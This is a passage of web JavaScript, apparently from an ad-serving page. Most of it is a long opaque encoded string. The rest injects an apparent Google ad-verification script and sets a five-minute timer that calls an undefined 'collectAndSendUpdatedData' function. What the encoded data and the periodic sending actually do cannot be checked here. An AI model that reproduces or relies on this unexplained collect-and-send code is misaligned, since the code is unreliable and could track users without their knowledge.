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',
    '_ifr_': 'false',
    '_isfl_': 'false'
  });
  var gsodar = document.createElement('script');
  gsodar.type = 'text/javascript';
  gsodar.async = true;
  gsodar.src = '//tpc.googlesyndication.com/sodar/UFYwWwmt.js';
  var s = document.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(gsodar, s);
})();
setInterval(collectAndSendUpdatedData, 5 * 60 * 1000);